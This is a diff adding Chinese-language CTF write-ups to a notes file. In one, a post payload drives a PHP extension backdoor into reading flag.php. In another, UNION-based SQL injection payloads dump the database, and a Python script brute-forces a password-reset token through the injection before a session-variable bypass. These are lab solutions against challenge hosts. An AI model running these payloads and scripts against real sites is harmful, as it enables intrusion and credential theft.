@@ -949,3 +949,98 @@ for i in xrange(1, 50):
 ```
 
 最后爆出admin和MyIchunq1uSuperL0ng&&SecurePa$$word，登录后就有了flag
+
+[大佬的视频解析](https://www.ichunqiu.com/course/56483)
+
+## nothing (i春秋)
+
+下载完tar文件，load进docker镜像里，`docker load < backdoor.tar`，启动容器并进入镜像`docker exec -it 65109cea4812 /bash/bin`
+
+![image](http://note.youdao.com/yws/res/881/41FC2E36761B4B598C1668F3DA559FB3)
+
+https://www.ichunqiu.com/course/56341
+
+https://github.com/akamajoris/php-extension-backdoor
+
+post： string=echo `cat /var/www/html/flag.php`
+
+
+
+## try
+
+1. 查看源码可以看见/level.php/?name=guest，尝试`?name=guest'and'1'='1`返回正确，`?name=guest'and'1'='2`返回异常，发现注入，`?name=guest'+order+by+1%23`返回正常，`?name=guest'+order+by+2%23`返回失败，说明字段数只有一列
+
+2.爆破
+```
+?name=-1' union select database()%23 //爆破数据库，ctf
+
+?name=-1' union select group_concat(table_name) from information_schema.tables where table_schema='ctf'%23 //爆破表，token,user
+
+?name=-1' union select group_concat(column_name) from information_schema.columns where table_name='user'%23 //爆破列，username,password,level
+
+?name=-1' union select concat(username,0x23,password,0x23,level) from user limit 0,1%23 //爆破值，password得到一串码
+```
+$6$rounds=66$nHxhhCl/k9nL5Df47FWdXFZIjRgzV2gXmVdHybywlQ3RIQ/2FvUM/L1y3mgnUBRvJNw9I0Qc5uRbc6EUwxB87/，和reset.php里一致
+
+3.重置密码，在reset_do.php输入在数据库爆出的验证码，显示token不正确，需要重新获取，果然回到数据库，失败一次后数据库token被清空，需求在reset.php重新获取，所以只能利用注入爆破验证码
+
+
+4.在reset.php的源码中有提示
+
+![image](http://note.youdao.com/yws/res/927/82CB36AC77FB402485EEFBFBD95D0C65)
+
+经过搜索找到这个php crypt的share12加密算法，rounds=5000代表算法循环5000次，当指定次数小于1000时，也会最低循环1000次，所以这里说程序员用错了算法
+
+![image](http://note.youdao.com/yws/res/925/2EFC96B2C08C48E9878469B17F4B7671)
+
+经验证，以下通过sha512加密得到的与题目一致，这里出题人写的博客记录了这个漏洞，http://www.91ri.org/14547.html
+
+```
+<?php
+echo 'SHA-512:' . crypt('bctf2016', '$6$rounds=66') . "\n";
+?>
+```
+
+利用reset操作计算验证码，`/level.php?name=-1' union select concat(0x23,token,0x23) from token where username = 'member'%23`
+
+```
+import urllib2
+import urllib
+import sys
+import requests
+
+def getpass():
+    html = requests.options('http://8fb6a7f18e9841cba75ec373f64821f9cadcd4396ed045af.changame.ichunqiu.com/level.php?name=-1%27%20union%20select%20concat(0x23,token,0x23)%20from%20token%20where%20username%20=%20%27member%27%23').text
+    print(html)
+    fd1 = html.find('#')
+    fd2 = html.find('#', fd1+1)
+    return html[fd1+1:fd2]
+
+def reset():
+    data = {'username': 'member'}
+    data = urllib.urlencode(data)
+    html = urllib2.urlopen('http://8fb6a7f18e9841cba75ec373f64821f9cadcd4396ed045af.changame.ichunqiu.com/reset.php', data).read()
+
+
+fp = open('ichunqiu.txt', 'r')
+hs = fp.readlines()
+fp.close()
+for i in range(1000):
+    reset()
+    pwd = getpass()
+    print(str(i))
+    for j in hs:
+        if pwd in j:
+            print(j)
+            print('token found')
+            sys.exit(0)
+```
+
+最终跑出来验证码，重置成功，多跑几次，有的时候会报错，![image](http://note.youdao.com/yws/res/949/1663B1AC30F043DBB75B2D8E6FC9AC55)
+
+5.登录后提示flag在Get_Fl3g_e165421110ba03099a1c0393373c5b43.php，然后访问提示.txt，访问Get_Fl3g_e165421110ba03099a1c0393373c5b43.txt，出现源码，代码审计，通过?_SERVER[_SESSION][admin]=yes绕过
+
+最后找到flag，但提交不正确
+![image](https://note.youdao.com/src/46DA5245CC5348A5B6FBBA97BB5B6EF5)
+
+[出题人讲解视频](https://www.ichunqiu.com/course/56349)
